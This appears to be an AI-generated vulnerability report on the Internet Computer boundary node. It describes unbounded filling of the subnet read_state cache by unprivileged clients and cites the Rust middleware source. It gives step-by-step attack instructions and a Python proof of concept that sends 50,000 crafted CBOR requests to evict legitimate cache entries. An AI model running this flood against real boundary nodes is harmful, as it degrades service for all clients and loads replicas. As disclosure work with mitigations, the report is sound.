Based on my thorough code analysis, here is the assessment:

---

### Title
Unbounded Subnet Read-State Cache Exhaustion by Unprivileged Client — (`rs/boundary_node/ic_boundary/src/http/middleware/subnet_read_state_cache.rs`)

### Summary
An unprivileged attacker can exhaust the shared `subnet_read_state_cache` on a boundary node by sending a high volume of `/api/v2/subnet/<valid_subnet_id>/read_state` requests with unique path label bytes in the body. Because there is no per-client quota on cache insertions and the cache key space is effectively unbounded, the attacker can fill the 10 MB cache, evicting legitimate routing-table entries and forcing all subsequent legitimate clients to miss the cache and hit replicas directly.

### Finding Description

**Cache key construction** — `CacheKey` is `(SubnetId_from_URL, ReadStatePaths_from_body)`. [1](#0-0) 

**Cacheability gate** — `should_cache_paths` admits a request if and only if it has exactly 2 paths, each with exactly 2 labels, the first labels are `"canister_ranges"` and `"subnet"` (in either order), and the second labels are `≤ Principal::MAX_LENGTH_IN_BYTES` (29 bytes). The second labels may be **any** byte sequence up to 29 bytes — they are not validated against known subnet IDs. [2](#0-1) 

**Cache insertion** — on a cache miss, if the upstream response is HTTP 200 and the body is within `max_item_size`, the response is inserted unconditionally with no per-client accounting. [3](#0-2) 

**URL subnet_id validation** — `validate_subnet_request` only checks that the URL subnet_id is a syntactically valid principal; it does **not** verify it is a registered subnet. Any valid principal string passes. [4](#0-3) 

**No per-client rate limiting on subnet routes by default** — `rate_limit_per_second_per_ip` and `rate_limit_per_second_per_subnet` are applied only to canister call routes. The bouncer (`--bouncer-enable`) and generic limiter are both opt-in and disabled by default. [5](#0-4) 

**Default cache capacity** — 10 MB, TTL 30 s. [6](#0-5) 

**Attack steps:**
1. Pick any known, routable subnet_id for the URL (e.g., the NNS subnet — publicly known).
2. Craft CBOR bodies with paths `[["canister_ranges", <N>], ["subnet", <N>]]` where `<N>` is a counter-incremented byte string ≤ 29 bytes. Each value of `N` produces a distinct `CacheKey`.
3. Each request reaches the replica (subnet_lookup succeeds), the replica returns HTTP 200 with a valid (possibly empty) certificate for the unknown path label, and the response is inserted into the cache.
4. After ~20,000–50,000 requests (depending on response size), the 10 MB cache is full; moka's weighted eviction begins discarding legitimate entries.
5. Legitimate clients querying routing-table data (`canister_ranges`/`subnet` for real subnet IDs) now miss the cache and must wait for replica round-trips on every request for the next 30 s TTL window.

### Impact Explanation
All boundary-node clients that rely on the subnet read-state cache for routing-table lookups experience elevated latency and increased replica load for the duration of the attack. The attacker must sustain ~10 MB/30 s of unique requests to keep the cache exhausted. The service remains functional (replicas still answer), but the caching invariant — that a single client cannot monopolize the shared cache — is violated.

### Likelihood Explanation
The attack requires only a valid subnet principal (publicly known), a CBOR library, and a network connection. No authentication, no privileged role, no key material. The attack is fully local-testable. The only mitigations (bouncer, generic rate limiter) are disabled by default.

### Recommendation
- Add a per-client (per-IP or per-sender) insertion quota or a global insertion-rate cap for the subnet read-state cache.
- Alternatively, restrict cacheable path labels to byte sequences that parse as **known, registered** subnet IDs (validated against the live routing snapshot), reducing the key space to the finite set of real subnets.
- Enable the bouncer by default or add a hard rate limit on the subnet read-state endpoint independent of the generic limiter.

### Proof of Concept
```python
import cbor2, requests, struct

SUBNET_URL = "https://<boundary_node>/api/v2/subnet/<nns_subnet_id>/read_state"

for n in range(50_000):
    label = struct.pack(">I", n).ljust(4, b'\x00')  # 4-byte unique label, valid principal length
    body = cbor2.dumps({
        "content": {
            "request_type": "read_state",
            "sender": bytes(1),          # anonymous
            "ingress_expiry": 2**63,
            "paths": [
                [b"canister_ranges", label],
                [b"subnet",          label],
            ]
        }
    })
    requests.post(SUBNET_URL, data=body,
                  headers={"Content-Type": "application/cbor"})
# After ~50k requests the cache is full; measure hit rate for legitimate requests → ~0%
```

### Citations

**File:** rs/boundary_node/ic_boundary/src/http/middleware/subnet_read_state_cache.rs (L23-27)
```rust
#[derive(Clone, Debug, PartialEq, Eq, Hash)]
struct CacheKey {
    subnet_id: SubnetId,
    paths: ReadStatePaths,
}
```

**File:** rs/boundary_node/ic_boundary/src/http/middleware/subnet_read_state_cache.rs (L128-146)
```rust
    state.misses.inc();

    let response = next.run(request).await;

    // Return response as-is if it failed or the advertised body size is too big
    if !response.status().is_success()
        || response.body().size_hint().exact() > Some(state.max_item_size as u64)
    {
        return Ok(response);
    }

    let (parts, body) = response.into_parts();
    let body_bytes = buffer_body_to_bytes(body, state.max_item_size, state.body_timeout).await?;

    let cached = Response::from_parts(parts, body_bytes);
    state.cache.insert(cache_key, cached.clone());
    state.update_gauges();

    Ok(cached.map(Body::from))
```

**File:** rs/boundary_node/ic_boundary/src/http/middleware/process.rs (L70-91)
```rust
pub(crate) fn should_cache_paths(paths: &[Vec<Blob>]) -> bool {
    // Check that we have correct lengths
    if paths.len() != 2 || paths.iter().any(|x| x.len() != 2) {
        return false;
    }

    // Check that 2nd labels are short enough to be Principals
    if !paths
        .iter()
        .all(|x| x[1].0.len() <= Principal::MAX_LENGTH_IN_BYTES)
    {
        return false;
    }

    // Check that we have a correct combination of 1st labels.
    // This looks a bit ugly, but efficient.
    [
        (&b"canister_ranges"[..], &b"subnet"[..]),
        (&b"subnet"[..], &b"canister_ranges"[..]),
    ]
    .contains(&(&paths[0][0].0[..], &paths[1][0].0[..]))
}
```

**File:** rs/boundary_node/ic_boundary/src/http/middleware/validate.rs (L65-93)
```rust
pub async fn validate_subnet_request(
    matched_path: MatchedPath,
    subnet_id: Path<String>,
    mut request: Request,
    next: Next,
) -> Result<impl IntoResponse, ApiError> {
    let request_type = match matched_path.as_str() {
        PATH_SUBNET_READ_STATE_V2 => RequestType::ReadStateSubnetV2,
        PATH_SUBNET_READ_STATE_V3 => RequestType::ReadStateSubnetV3,
        PATH_SUBNET_QUERY_V3 => RequestType::QuerySubnetV3,
        PATH_SUBNET_CALL_V4 => RequestType::CallSubnetV4,
        _ => panic!("unknown path, should never happen"),
    };

    request.extensions_mut().insert(request_type);

    // Decode subnet ID from URL
    let principal_id: PrincipalId = Principal::from_text(subnet_id.as_str())
        .map_err(|err| {
            ErrorCause::MalformedRequest(format!("Unable to decode subnet_id from URL: {err}"))
        })?
        .into();
    let subnet_id = SubnetId::from(principal_id);

    request.extensions_mut().insert(subnet_id);

    let resp = next.run(request).await;
    Ok(resp)
}
```

**File:** rs/boundary_node/ic_boundary/src/core.rs (L1033-1040)
```rust
    let subnet_layers = ServiceBuilder::new()
        .layer(middleware::from_fn(validate::validate_request))
        .layer(middleware::from_fn(validate::validate_subnet_request))
        .layer(common_layers)
        .layer(middleware_subnet_read_state_cache)
        .layer(middleware_subnet_lookup)
        .layer(middleware_generic_limiter)
        .layer(middleware_retry);
```

**File:** rs/boundary_node/ic_boundary/src/cli.rs (L346-367)
```rust
pub struct SubnetReadStateCache {
    /// Disable subnet read_state caching
    #[clap(env, long)]
    pub subnet_read_state_cache_disable: bool,

    /// TTL for cached subnet read_state responses
    #[clap(env, long, default_value = "30s", value_parser = parse_duration)]
    pub subnet_read_state_cache_ttl: Duration,

    /// Maximum size of the subnet read_state cache in bytes
    #[clap(env, long, default_value = "10MB", value_parser = parse_size)]
    pub subnet_read_state_cache_size: u64,

    /// Maximum size of a single cached response body in bytes.
    /// Responses larger than this will not be cached.
    #[clap(env, long, default_value = "1MB", value_parser = parse_size_usize)]
    pub subnet_read_state_cache_max_item_size: usize,

    /// Timeout for buffering the response body before caching
    #[clap(env, long, default_value = "10s", value_parser = parse_duration)]
    pub subnet_read_state_cache_body_timeout: Duration,
}
```
